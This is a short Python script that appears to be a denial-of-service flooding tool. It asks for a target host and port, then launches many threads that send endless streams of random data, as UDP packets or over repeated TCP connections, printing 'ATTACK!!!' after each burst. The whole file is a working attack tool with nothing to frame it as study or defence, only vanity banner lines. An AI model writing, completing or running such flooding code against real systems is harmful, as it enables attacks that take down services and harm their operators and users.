#!/usr/bin/env python3

import random
import socket
import threading

print("USER: ADMIN_TIGER  VIP: START ! ")
print("V3.1 VPS (ON TCP/UDP)")
print(" TCP / UDP = START ! ")
print(" STCP / SUDP  = START ! ")
print(" HOMEUDP  = START ! ")
print(" API : 127b255bA2521SsA = START ! ")
print(" ! START IP RUNTIME START !  ")
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
times = int(input("GM TCP ON = 100 off = 0 :"))
threads = int(input("GM UDP ON = 100 off = 0  :"))
choice = str(input(" SUDP/STCP ( START / NORUN ) :"))	
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK!!!")
		except:
			print("[!] ERROR!!!")
			
def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ATTACK!!!")
		except:
			s.close()
			print("[*] ERROR")

for Y in range(threads):
	if choice == 'START':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()